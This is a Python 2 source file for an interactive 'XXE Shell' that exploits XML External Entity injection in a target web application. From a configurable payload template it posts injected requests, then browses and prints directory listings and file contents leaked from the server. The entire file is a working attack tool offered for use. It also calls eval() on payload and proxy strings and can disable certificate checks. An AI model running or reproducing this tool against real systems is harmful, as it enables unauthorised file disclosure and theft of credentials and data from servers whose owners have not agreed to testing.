#!/usr/bin/env python
# coding=utf-8


"""XXE Shell
Usage:
    xshell.py [-ch]

Options:
    -c --config=config      The config.ini path
    -h --help               Shows this help

"""
import os
import sys
import atexit
import readline
import ConfigParser
from cmd import Cmd
import requests
from docopt import docopt
from utils.colors import *


delims = readline.get_completer_delims()
readline.set_completer_delims(delims.replace("/", ""))
requests.packages.urllib3.disable_warnings()


def cls():
    os.system(['clear', 'cls'][os.name == 'nt'])


def read_config(f):
    cp = ConfigParser.ConfigParser()
    cp.read(f)
    config = {}
    try:
        config['use_proxy'] = cp.get('vars', 'use_proxy')
    except:
        config['use_proxy'] = False
    try:
        config['leak_url'] = cp.get('vars', 'leak_url')
    except:
        config['leak_url'] = None
    try:
        config['proxies'] = cp.get('vars', 'proxies')
    except:
        config['proxies'] = {}
    try:
        config['payload'] = cp.get('vars', 'payload')
    except:
        config['payload'] = None
    try:
        config['verify_ssl'] = cp.get('vars', 'verify_ssl')
    except:
        config['verify_ssl'] = True
    try:
        config['wrapper'] = cp.get('vars', 'wrapper')
    except:
        config['wrapper'] = ""
    return config


def normalize_path(path, cwd):
    if path == "." or path == "$" or path == "orig":
        ret = "./"
    elif path.startswith("~"):
        ret = os.path.normpath(path)
    elif path.startswith("/"):
        ret = os.path.normpath(path)
    else:
        ret = os.path.normpath(cwd + path)
    if not ret.endswith("/"):
        ret += "/"
    return ret


class XShell(object, Cmd):
    def __init__(self):
        super(XShell, self).__init__()
        self.intro = "\nXXE Interactive console\n"
        self.intro += "Type help or ? to get help. "
        self.intro += "Use up/down arrow to navigate your command history and tab to autocomplete.\n"
        self.cmdqueue = []
        self.completekey = 'tab'
        self.stdin = sys.stdin
        self.stdout = sys.stdout
        self.separation = "===== LEAK ====="
        self.payload = None
        self.proxies = {}
        self.url = None
        self.verify_ssl = True
        self.use_proxy = False
        self.wrapper = ""
        self.cwd = "./"
        self.prompt = "%s:%s $ " % (red("XShell"), yellow(self.cwd))
        self.complete_files = []
        self.init_history()
        cls()

    def init_history(self):
        if os.path.exists(".xshell_history"):
            readline.read_history_file(".xshell_history")
        else:
            open(".xshell_history", "a").close()
        atexit.register(self.save_history, ".xshell_history")

    def save_history(self, history):
        readline.write_history_file(history)

    def request(self, leak):
        data = eval(self.payload.replace("{{INJECTION}}", leak))
        try:
            if self.use_proxy:
                if self.verify_ssl is not True:
                    req = requests.post(self.url, data, proxies=self.proxies, verify=self.verify_ssl)
                else:
                    req = requests.post(self.url, data, proxies=self.proxies)
            else:
                if self.verify_ssl is not True:
                    req = requests.post(self.url, data, verify=self.verify_ssl)
                else:
                    req = requests.post(self.url, data)
        except Exception as e:
            print("request", e)
            req = "Error during request"
        return req.text

    def parse_request(self, text, leak):
        try:
            leak = text.split(self.separation)[1]
        except:
            return "No result for \"%s\" or insufficient rights." % leak
        else:
            return leak

    def config_vars(self, vars):
        for k, v in vars.items():
            self.do_set("%s=%s" % (k, v))

    def parse_ls(self, ls, path):
        files = ls.splitlines()
        if not path.endswith("/"):
            path += "/"
        for f in files:
            self.complete_files.append(path + f)
        # print(self.complete_files)

    def cmdloop(self, intro=None):
        print(self.intro)
        try:
            super(XShell, self).cmdloop(intro="")
        except KeyboardInterrupt:
            self.cmdloop()
        except Exception as e:
            print("cmdloop", e)

    def emptyline(self):
        return

    def can_exit(self):
        return True

    def do_q(self, line):
        """Exit short command"""
        if raw_input("\nSure you want to exit? (yes/no) ") == "yes":
            print("")
            return True

    def do_quit(self, line):
        """Exit command"""
        self.do_q("")

    def do_exit(self, line):
        """Exit command"""
        self.do_q("")
    do_EOF = do_q

    def do_shell(self, line):
        """Execute a shell command (prepend it with ! if you don't want to write "shell cmd" every time)"""
        os.system(line)

    def complete_set(self, text, line, begidx, endidx):
        if not text:
            completions = ["leak_url", "proxies", "use_proxy", "verify_ssl",
                           "payload", "wrapper"]
        elif "leak_url".startswith(text.lower()):
            completions = ["leak_url"]
        elif "proxies".startswith(text.lower()):
            completions = ["proxies"]
        elif "use_proxy".startswith(text.lower()):
            completions = ["use_proxy"]
        elif "verify_ssl".startswith(text.lower()):
            completions = ["verify_ssl"]
        elif "payload".startswith(text.lower()):
            completions = ["payload"]
        elif "wrapper".startswith(text.lower()):
            completions = ["wrapper"]
        else:
            completions = []

        return completions

    def do_set(self, line):
        """Use this to set a variable
        payload must be a valid python dictionnary (given in the console or via file). It will be sent to the server via post so it must contain all needed keys. It must also contain the strings {{INJECTION}} and {{SEPARATION}} where the injection must be done and where the result can be found. (required)
        leak_url is the URL to query (required)
        use_proxy is a boolean (default: false, optional)
        proxies must be a valid python dictionnary with wanted protocols e.g. {"http": "...", "ftp": "...", ...} (default: empty, optional)
        verify_ssl can be true (default), false (does not check certificate) or set to the path of a certificate (e.g. for Burp) (optional)
        """
        try:
            l = line.lower()
            if "use_proxy=" in l:
                x = l.split("=")[1]
                if x == "false" or x == "0":
                    self.use_proxy = False
                    psuccess("use_proxy is now %s" % yellow("false"))
                elif x == "true" or x == "1":
                    self.use_proxy = True
                    psuccess("use_proxy is now %s" % yellow("true"))
                else:
                    perror("Error setting use_proxy")
            elif "proxies=" in l:
                x = l.split("=")[1]
                try:
                    self.proxies = eval(x)
                except Exception as e:
                    perror("%s (proxies must be a valid python dict)" % e)
                else:
                    psuccess("Proxies are now %s" % yellow(self.proxies))
            elif "leak_url=" in l:
                self.url = line.split("=")[1]
                psuccess("Url is now %s" % yellow(self.url))
            elif "verify_ssl=" in l:
                x = line.split("=")[1]
                if os.path.exists(x):
                    self.verify_ssl = x
                    psuccess("verify_ssl is now %s" % yellow(self.verify_ssl))
                elif x == "false" or x == "0":
                    self.verify_ssl = False
                    psuccess("verify_ssl is now %s" % yellow(self.verify_ssl))
                elif x == "true" or x == "1":
                    self.verify_ssl = True
                    psuccess("verify_ssl is now %s" % yellow(self.verify_ssl))
                else:
                    perror("Error setting verify_ssl")
            elif "payload=" in l:
                x = line.split("=")[1]
                if os.path.exists(x):
                    with open(x) as f:
                        x = f.read()
                try:
                    eval(x)
                except Exception as e:
                    perror("%s (payload must be a valid python dict)" % e)
                else:
                    self.payload = x.replace("{{SEPARATION}}", self.separation)
                    psuccess("Payload is now %s..." % yellow(self.payload[:20]))
            elif "wrapper=" in l:
                self.wrapper = line.split("=")[1]
                psuccess("Wrapper is now %s" % yellow(self.wrapper))
            if self.url is not None and self.payload is not None:
                self.prompt = "%s:%s $ " % (green("XShell"), yellow(self.cwd))
            else:
                self.prompt = "%s:%s $ " % (red("XShell"), yellow(self.cwd))
        except Exception as e:
            print("set", e)

    def do_vars(self, line):
        """Prints the value of customizable variables"""
        try:
            pinfo("use_proxy is set to %s" % yellow(self.use_proxy))
            pinfo("proxies is set to %s" % yellow(self.proxies))
            pinfo("verify_ssl is set to %s" % yellow(self.verify_ssl))
            pinfo("wrapper is set to %s" % yellow(self.wrapper))
            if self.payload is None:
                pinfo("payload is not set, you can't begin leaking info!")
            if self.url is None:
                pinfo("leak_url is not set, you can't begin leaking info!")
            if self.url is not None and self.payload is not None:
                pinfo("payload is set to %s" % yellow(self.payload[:20]))
                pinfo("leak_url is set to %s" % yellow(self.url))
                pinfo("All is good! You can try leaking info!")
        except Exception as e:
            print("vars", e)

    def do_pwd(self, line):
        """Displays current directory"""
        print("Current path: %s" % self.cwd)

    def complete_cd(self, text, line, begidx, endidx):
        completions = []
        path = normalize_path(line, self.cwd)
        for c in self.complete_files:
            if c.startswith(path):
                completions.append(c)
        return completions

    def do_cd(self, line):
        """Changes current directory"""
        self.cwd = normalize_path(line, self.cwd)
        if self.url is not None and self.payload is not None:
            self.prompt = "%s:%s $ " % (green("XShell"), yellow(self.cwd))
        else:
            self.prompt = "%s:%s $ " % (red("XShell"), yellow(self.cwd))
        psuccess("Changing current path to \"%s\"" % yellow(self.cwd))

    def complete_ls(self, text, line, begidx, endidx):
        completions = []
        path = normalize_path(line, self.cwd)
        for c in self.complete_files:
            if c.startswith(path):
                completions.append(c)
        return completions

    def do_ls(self, line):
        """Leaks listing of a directory"""
        if self.payload is None or self.url is None:
            perror("The variables payload and url_leak MUST be set")
            return
        leak = normalize_path(line, self.cwd)
        pinfo("Leaking %s" % leak)
        x = self.request("%s%s" % (self.wrapper, leak))
        x = self.parse_request(x, line)
        self.parse_ls(x, leak)
        if x.endswith(" or insufficient rights."):
            perror(x)
        else:
            psuccess("Result:\n%s" % x)

    def complete_cat(self, text, line, begidx, endidx):
        completions = []
        try:
            self.complete_files[self.cwd]
        except:
            pass
        else:
            for c in self.complete_files[self.cwd]:
                if c.startswith(text):
                    completions.append(c)
        return completions

    def do_cat(self, line):
        """Leaks content of a file"""
        if self.payload is None or self.url is None:
            perror("The variables payload and url_leak MUST be set")
            return
        if line.startswith("/"):
            leak = line
        else:
            leak = self.cwd + line
        print("Leaking %s" % leak)
        x = self.request("%s%s" % (self.wrapper, leak))
        x = self.parse_request(x, line)
        if x.endswith(" or insufficient rights."):
            perror(x)
        else:
            pinfo("Result:\n%s" % x)


if __name__ == "__main__":
    args = docopt(__doc__, version='0.1.0')
    if args['--config'] is not None:
        config = read_config(args['--config'])
        x = XShell()
        x.config_vars(config)
        x.cmdloop()
    else:
        XShell().cmdloop()
